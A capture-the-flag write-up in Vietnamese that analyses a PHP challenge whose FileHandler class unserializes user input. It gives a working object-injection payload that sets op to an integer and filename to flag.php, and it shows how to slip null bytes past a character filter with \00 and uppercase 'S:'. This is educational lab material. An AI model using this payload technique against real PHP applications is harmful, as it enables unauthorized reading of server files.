```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

Ta có thể gửi tham số str thông qua method GET, sau đó nó sẽ được xử lý quá hàm is_valid().Nếu true thì sẽ unserialize() biến str rồi gán cho biến obj.

Hàm is_valid() cho phép các kí tự ASCII trong khoảng 32-125.

Khi unserialize() biến str thì hàm __destruct() sẽ được tự dộng gọi và sử op thành 1, content thành "".Và gọi đến hàm process().

```
 public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```

Nếu op là 1 thì sẽ gọi đến hàm write, op là 2 thì gọi hàm read, gán giá trị cho biến res và in ra nó.Và hàm read dùng hàm file_get_contents cho biến filename và ở đó cũng chẵng có filter gì nên là ta sẽ dùng cái này để đọc flag.

```
 private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
```

Hàm write thì nó kiểm tra có tồn tại filename và content được khai báo hay có giá trị chưa. Sau đó kiểm tra độ dài của cotent có quá 100.Nếu đúng thì nó sẽ gọi hàm file_put_contents() để ghi nội dung đã được chỉ định bởi $this->filename và gán cho biến res.

```
private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
```

Payload

```
<?php

class FileHander {
    protected $op = '2';
    protected $filename = 'flag.php';
    protected $content = 'aaa';
}

$a = new FileHander();
$res = serialize($a);
$res = str_replace(chr(0), '\00', $res);
$res = str_replace('s:', 'S:', $res);
echo $res
?>
```

Lúc ban đầu mình chạy ra thì output có NUllbyte nhưng do hàm is_valid kiểm tra Nullby lại ko có trong giới hạn của nó nên bị denied.Rồi mình research thì

```
s:5:"A<null_byte>B<cr><lf>";̀ -> S:5:"A\00B\09\0D";
```

Nên NULLnyte được thay bằng `\00` với điều kiện sau đó là uppercase

Payload: O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:3:"aaa";}

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/254c57f2-af52-491c-8eaa-3c6e1d6ea536)

